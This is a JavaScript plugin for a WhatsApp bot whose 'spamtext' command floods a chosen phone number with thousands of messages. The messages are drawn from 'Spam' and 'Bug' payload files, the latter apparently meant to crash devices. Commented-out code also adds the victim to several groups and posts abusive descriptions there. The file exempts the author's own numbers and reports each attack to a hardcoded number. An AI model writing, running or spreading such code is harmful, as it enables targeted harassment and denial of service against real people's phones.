import { time } from 'console';
import fs from 'fs'
import moment from 'moment-timezone'

let handler = async (m, { conn, args , command, text, usedPrefix }) => {


    moment.tz.setDefault("Asia/Colombo").locale("id");

    
let victim = text.split("/")[0]
let count = text.split("/")[1]


if (!victim) throw `! Enter Victim number and count correctly [ ex :- .spam 94778115292/2000 ] (Default count is 1000)`

if (!count) { count = 1000}

if (victim.includes (` `)) throw `no spaces`
if (victim.length > 11) throw `! Incorrect Number`
if (victim.length < 11) throw `! Incorrect Number`

if (victim.includes (`5292`)) throw `Are You Kidding me ?`
 if (victim.includes (`1056`)) throw `Are you going to destroy Dilshan's samsung galaxy s10+ ? It's not possible`
//if (victim.includes (`5292`)) throw `Are you going to destroy Dilshan's samsung galaxy s10+ ? It's not possible`
if (victim.includes (`7665`)) throw `Nice try :-) try again later` 
if (victim.includes (`1095`)) throw `This is my number , fuck ?`

let d2 = new Date(new Date + 3600000)

let locale = 'ta-LK'
// let spams = [`./Spam/text/text/spam.txt`,`./Spam/text/text/spam (copy 1).txt`,`./Spam/text/text/spam (copy 2).txt`,`./Spam/text/text/spam (copy 3).txt`,`./Spam/text/text/spam (copy 4).txt`,`./Spam/text/text/s.txt`,`./Spam/text/text/s2.txt`,`./Spam/text/text/s3.txt`,`./Spam/text/text/s4.txt`]
//let spams = ['./Spam/s.txt','./Spam/Bug 02.txt','./Spam/Bug 03.txt','./Spam/Bug 04.txt' , './Spam/Bug 05.txt' , './Spam/Spam 01.txt' , './Spam/Spam 03.txt']
let spams = ['./Spam/text/s.txt','./Spam/text/Bug 02.txt','./Spam/text/Bug 03.txt','./Spam/text/Bug 04.txt' , './Spam/text/Bug 05.txt' , './Spam/text/Spam 01.txt' , './Spam/text/Spam 03.txt']
/* let time = d2.toLocaleTimeString(locale, {
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric'
    }) */



let victim2 = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g, '')+'@s.whatsapp.net'



/* while (i < count) {

await conn.sendText(victim2, textx)

i++

} */

// let d = `${moment.tz('Asia/Colombo').format('YY/MM/DD')}`


let i2 = 0;

// await conn.groupParticipantsUpdate (`120363042414339652@g.us` , [victim], 'add')

// let groupsx = [`120363042283397418@g.us`,`120363041793802829@g.us`]
/* let group1 = `120363042283397418@g.us`
let group2 = `120363041793802829@g.us`
let group3 = `120363040842107188@g.us`
let group4 = `120363026344956097@g.us`
let group5 = `120363044336356477@g.us`
let group6 = `120363024472896585@g.us`
let group7 = `120363041662300064@g.us`


await conn.sendMessage(m.chat, { text : `Adding to 10 Groups !` } , { quoted: m } )

await conn.groupUpdateDescription(group1, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

await conn.groupUpdateDescription(group2, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

await conn.groupUpdateDescription(group3, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

await conn.groupUpdateDescription(group4, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

await conn.groupUpdateDescription(group5, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

await conn.groupUpdateDescription(group6, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

await conn.groupUpdateDescription(group7, `Dear Fucker - ${victim} , You're Spammed by Urt ! on 20${d} at ${time}`)

    
    await conn.groupParticipantsUpdate(group1, [victim2], 'add') 
    await conn.groupParticipantsUpdate(group2, [victim2], 'add')
    await conn.groupParticipantsUpdate(group3, [victim2], 'add')
    await conn.groupParticipantsUpdate(group4, [victim2], 'add')
    await conn.groupParticipantsUpdate(group5, [victim2], 'add')
    await conn.groupParticipantsUpdate(group6, [victim2], 'add')
    await conn.groupParticipantsUpdate(group7, [victim2], 'add') */

    await conn.sendMessage(m.chat, { text : `Sending ${count *2} Spams` } , { quoted: m } )

while (i2 < count * 2 ) {


    let spam1 =  spams[Math.floor(Math.random() * spams.length)]


let textx = fs.readFileSync(`${spam1}`)

    

    //await conn.sendText(victim2, textx)
    
   await conn.sendMessage(victim2, { text : textx })
   /* await conn.sendMessage(victim2, { text : textx })
   await conn.sendMessage(group2, { text : textx })
   await conn.sendMessage(group3, { text : textx })
   await conn.sendMessage(group4, { text : textx })
   await conn.sendMessage(group5, { text : textx })
   await conn.sendMessage(group6, { text : textx })
   await conn.sendMessage(group7, { text : textx })
 */

    //await conn.sendText(group2, textx)
    // conn.sendText(m.chat, textx , m)

    
    i2++
 


}


/* await conn.sendMessage(m.chat, { text : `Removing Groups` } , { quoted: m } )


    await conn.groupParticipantsUpdate(group1, [victim2], 'remove') 
    await conn.groupParticipantsUpdate(group2, [victim2], 'remove')
    await conn.groupParticipantsUpdate(group3, [victim2], 'remove')
    await conn.groupParticipantsUpdate(group4, [victim2], 'remove')
    await conn.groupParticipantsUpdate(group5, [victim2], 'remove')
    await conn.groupParticipantsUpdate(group6, [victim2], 'remove')
    await conn.groupParticipantsUpdate(group7, [victim2], 'remove') */

    await conn.sendMessage(m.chat, { text : `Succesfully sent ${count * 2} spam to number wa.me/${victim}` } , { quoted: m } )
//await conn.sendText(m.chat , `Succesfully spammed number wa.me/${victim}`)
await conn.sendMessage(`94778115292@whatsapp.net`, { text : `Succesfully spammed ${count} number wa.me/${victim}` } , { quoted: m } )
// await conn.sendText(`94778115292@whatsapp.net` , `Succesfully spammed number wa.me/${victim}`)
 
}



handler.command = /^(spamtext)$/i
handler.admin = true
export default handler